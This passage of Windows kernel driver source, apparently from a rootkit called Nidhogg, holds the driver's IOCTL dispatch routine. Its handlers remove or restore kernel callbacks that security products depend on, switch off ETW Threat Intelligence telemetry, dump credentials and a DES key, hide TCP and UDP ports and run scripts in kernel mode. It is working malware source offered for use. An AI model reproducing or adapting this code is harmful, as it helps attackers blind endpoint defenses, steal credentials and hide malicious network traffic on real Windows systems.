		if (data->NumberOfCallbacks == 0 && data->Callbacks) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case ObProcessType:
		case ObThreadType: {
			status = NidhoggAntiAnalysis->ListObCallbacks(data);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		len += size;
		break;
	}

	case IOCTL_LIST_PSROUTINES:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(PsRoutinesList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<PsRoutinesList*>(Irp->AssociatedIrp.SystemBuffer);

		if (!data->Routines) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case PsImageLoadType:
		case PsCreateProcessTypeEx:
		case PsCreateProcessType:
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread: {
			status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		len += size;
		break;
	}
	case IOCTL_LIST_REGCALLBACKS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(CmCallbacksList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<CmCallbacksList*>(Irp->AssociatedIrp.SystemBuffer);

		if (!data->Callbacks) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);

		len += size;
		break;
	}

	case IOCTL_REMOVE_RESTORE_CALLBACK:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(KernelCallback))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<KernelCallback*>(Irp->AssociatedIrp.SystemBuffer);

		if (!VALID_KERNELMODE_MEMORY(data->CallbackAddress)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Remove) {
			switch (data->Type) {
			case PsImageLoadType:
			case PsCreateProcessType:
			case PsCreateProcessTypeEx:
			case PsCreateThreadType:
			case PsCreateThreadTypeNonSystemThread:
			case ObProcessType:
			case ObThreadType:
			case CmRegistryType: {
				status = NidhoggAntiAnalysis->RemoveCallback(data);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
			}
			NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Removed callback %p.\n", data->CallbackAddress) :
				Print(DRIVER_PREFIX "Failed to remove callback (0x%08X).\n", status);
		}
		else {
			switch (data->Type) {
			case PsImageLoadType:
			case PsCreateProcessType:
			case PsCreateProcessTypeEx:
			case PsCreateThreadType:
			case PsCreateThreadTypeNonSystemThread:
			case ObProcessType:
			case ObThreadType:
			case CmRegistryType: {
				status = NidhoggAntiAnalysis->RestoreCallback(data);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
			}

			NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Restored callback %p.\n", data->CallbackAddress) :
				Print(DRIVER_PREFIX "Failed to restore callback (0x%08X).\n", status);
		}

		len += size;
		break;
	}

	case IOCTL_ENABLE_DISABLE_ETWTI:
	{
		bool enable = false;

		if (!Features.EtwTiTamper) {
			Print(DRIVER_PREFIX "Due to previous error, etwti tampering is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(bool))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<bool*>(Irp->AssociatedIrp.SystemBuffer);
		enable = *data;
		status = NidhoggAntiAnalysis->EnableDisableEtwTI(enable);

		if (!NT_SUCCESS(status))
			Print(DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status);

		len += size;
		break;
	}

	case IOCTL_DUMP_CREDENTIALS:
	{
		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (!IsValidSize(size, sizeof(ULONG)) && !IsValidSize(size, sizeof(DesKeyInformation)) &&
			!IsValidSize(size, sizeof(OutputCredentials))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (size == sizeof(ULONG)) {
			ULONG sizeToAlloc = 0;
			auto data = static_cast<ULONG*>(Irp->AssociatedIrp.SystemBuffer);
			status = NidhoggMemoryUtils->DumpCredentials(&sizeToAlloc);

			if (NT_SUCCESS(status)) {
				status = ProbeAddress(data, sizeof(ULONG), sizeof(ULONG), STATUS_INVALID_ADDRESS);

				if (NT_SUCCESS(status))
					*data = sizeToAlloc;
			}
		}
		else if (size == sizeof(OutputCredentials)) {
			auto data = static_cast<OutputCredentials*>(Irp->AssociatedIrp.SystemBuffer);
			status = NidhoggMemoryUtils->GetCredentials(data);
		}
		else {
			auto data = static_cast<DesKeyInformation*>(Irp->AssociatedIrp.SystemBuffer);
			status = NidhoggMemoryUtils->GetDesKey(data);
		}

		if (!NT_SUCCESS(status))
			Print(DRIVER_PREFIX "Failed to dump credentials (0x%08X)\n", status);

		len += size;
		break;
	}

	case IOCTL_HIDE_UNHIDE_PORT:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(InputHiddenPort))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		HiddenPort hiddenPort{};
		auto data = static_cast<InputHiddenPort*>(Irp->AssociatedIrp.SystemBuffer);

		hiddenPort.Type = data->Type;
		hiddenPort.Remote = data->Remote;
		hiddenPort.Port = data->Port;

		if (hiddenPort.Port == 0 || (hiddenPort.Type != PortType::TCP && hiddenPort.Type != PortType::UDP)) {
			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Hide) {
			if (NidhoggNetworkUtils->GetPortsCount() == MAX_PORTS) {
				Print(DRIVER_PREFIX "List is full.\n");
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			if (!NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
				if (!NidhoggNetworkUtils->AddHiddenPort(hiddenPort)) {
					Print(DRIVER_PREFIX "Failed to add port.\n");
					status = STATUS_UNSUCCESSFUL;
					break;
				}
				Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
			}
		}
		else {
			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
				status = STATUS_NOT_FOUND;
				break;
			}

			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
				status = STATUS_NOT_FOUND;
				break;
			}
			Print(DRIVER_PREFIX "Unhide port %d.\n", hiddenPort.Port);
		}

		len += size;
		break;
	}
	case IOCTL_QUERY_HIDDEN_PORTS:
	{
		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (!IsValidSize(size, sizeof(OutputHiddenPorts))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<OutputHiddenPorts*>(Irp->AssociatedIrp.SystemBuffer);
		NidhoggNetworkUtils->QueryHiddenPorts(data);

		len += size;
		break;
	}
	case IOCTL_CLEAR_HIDDEN_PORTS:
	{
		NidhoggNetworkUtils->ClearHiddenPortsList();
		break;
	}
	case IOCTL_EXEC_SCRIPT:
	{
		ScriptManager* scriptManager = nullptr;
		ScriptInformation scriptInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ScriptInformation))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ScriptInformation*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->ScriptSize == 0 || !data->Script) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		scriptInfo.ScriptSize = data->ScriptSize;
		MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
		status = scriptAllocator.CopyData(data->Script, scriptInfo.ScriptSize);

		if (!NT_SUCCESS(status))
			break;

		__try {
			scriptManager = new ScriptManager();
			status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			status = GetExceptionCode();
		}

		if (scriptManager) {
			delete scriptManager;
			scriptManager = nullptr;
		}

		NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Executed script successfully.\n") :
			Print(DRIVER_PREFIX "Failed to execute script (0x%08X)\n", status);

		len += size;
		break;
	}
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}


/*
* Description:
* NidhoggCreateClose is responsible for creating a success response for given IRP.
*
* Parameters:
* @DeviceObject [_Inout_ PDEVICE_OBJECT] -- Not used.
* @Irp			[_Inout_ PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS NidhoggCreateClose(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}